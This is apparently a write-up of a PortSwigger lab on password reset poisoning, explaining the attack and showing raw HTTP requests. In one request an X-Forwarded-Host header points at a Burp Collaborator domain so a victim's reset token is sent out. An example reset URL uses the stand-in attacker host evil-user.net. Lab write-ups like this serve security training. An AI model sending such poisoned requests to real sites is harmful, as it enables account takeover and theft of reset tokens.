## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/311fc73a-63a6-4cd4-886c-b83d0432ce58)

## Overview :

**Password Reset Poisoning -**
 Password reset poisoning is a technique whereby an attacker manipulates a vulnerable website into generating a password reset link pointing to a domain under their control. This behavior can be leveraged to steal the secret tokens required to reset arbitrary users' passwords and, ultimately, compromise their accounts. 
 
 #### How this attack works ?
 
1. The attacker obtains the victim's email address or username, as required, and submits a password reset request on their behalf. When submitting the form, they intercept the resulting HTTP request and modify the Host header so that it points to a domain that they control. For this example, we'll use evil-user.net.

2. The victim receives a genuine password reset email directly from the website. This seems to contain an ordinary link to reset their password and, crucially, contains a valid password reset token that is associated with their account. However, the domain name in the URL points to the attacker's server:
    
    ```http
    https://evil-user.net/reset?token=0a1b2c3d4e5f6g7h8i9j
    ```
    
3. If the victim clicks this link (or it is fetched in some other way, for example, by an antivirus scanner) the password reset token will be delivered to the attacker's server. 
4. The attacker can now visit the real URL for the vulnerable website and supply the victim's stolen token via the corresponding parameter. They will then be able to reset the user's password to whatever they like and subsequently log in to their account. 
 
References :

  - https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html
  - https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning

## Solution :

The lab is a blog website,

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/cc42a1e6-2077-48df-b2d4-98dfbb24073d)
 

Clicking on *My Account* takes us to this login page,

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/53b86e71-64c5-4476-9882-cd8341df296b)

When we click on forgot password, browser sends a *POST* request to `/forgot-password` along with `username=wiener` parameter.

```http
POST /forgot-password HTTP/2
Host: 0ad700ef037b819c8101e38400e800fb.web-security-academy.net
Cookie: session=eiaiChHGmHu6RsgwQZFBmVObpnNqH12j
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://0ad700ef037b819c8101e38400e800fb.web-security-academy.net
Referer: https://0ad700ef037b819c8101e38400e800fb.web-security-academy.net/forgot-password
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

username=wiener
```

After forwarding the above request, we can see the reset password link has been sent to wiener's email.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/06ff086c-37fa-499e-8d9f-23590381cc4a)

> Here the server address in the link is `0a6a00d804e104958379c52d007300c9.web-security-academy.net` & `temp-forgot-password-token=T9Ou8Nr4HEdnClSG7cAwBWkaukma1orc`

When we click the link, enter  our new password , a *GET* request is sent to /forgot-password along with a token like this

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/624308f1-4933-4217-a18c-00c8f8d4706a)


```http
POST /forgot-password?temp-forgot-password-token=T9Ou8Nr4HEdnClSG7cAwBWkaukma1orc HTTP/2
Host: 0a6a00d804e104958379c52d007300c9.web-security-academy.net
Cookie: session=Kt96OLQV957nJQYx78S8js3xPZQGU1Ow
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 105
Origin: https://0a6a00d804e104958379c52d007300c9.web-security-academy.net
Referer: https://0a6a00d804e104958379c52d007300c9.web-security-academy.net/forgot-password?temp-forgot-password-token=T9Ou8Nr4HEdnClSG7cAwBWkaukma1orc
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

temp-forgot-password-token=T9Ou8Nr4HEdnClSG7cAwBWkaukma1orc&new-password-1=newpass&new-password-2=newpass
```

And thus we've finally changed the password of wiener using the password reset link.

#### Perform password reset poisoning on carlos -


We modify the *POST* Request sent to /`forget-password` by adding an additional header `X-Forwarded-Host=<our-server.net>` 

```http
POST /forgot-password HTTP/2
Host: 0a6a00d804e104958379c52d007300c9.web-security-academy.net
Cookie: session=Kt96OLQV957nJQYx78S8js3xPZQGU1Ow
X-Forwarded-Host: bcrgwu2v1zwfwvzuucncws1qnht8hx.oastify.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://0a6a00d804e104958379c52d007300c9.web-security-academy.net
Referer: https://0a6a00d804e104958379c52d007300c9.web-security-academy.net/forgot-password
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

username=carlos
```
Now we can see that we got the reset link to our mail(wiener) but this time the server name is our burp collaborator server.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/998a51a6-9adb-436c-bb32-127dfc5b627f)

We can change the username parameter to carlos ie(`username=carlos`) to send a password reset email to carlos.

Since it is given in the lab description that **user carlos will carelessly click on any links in emails that he receives**. It means he will enter his username and password for resetting his old password by clicking on our malicious link.



















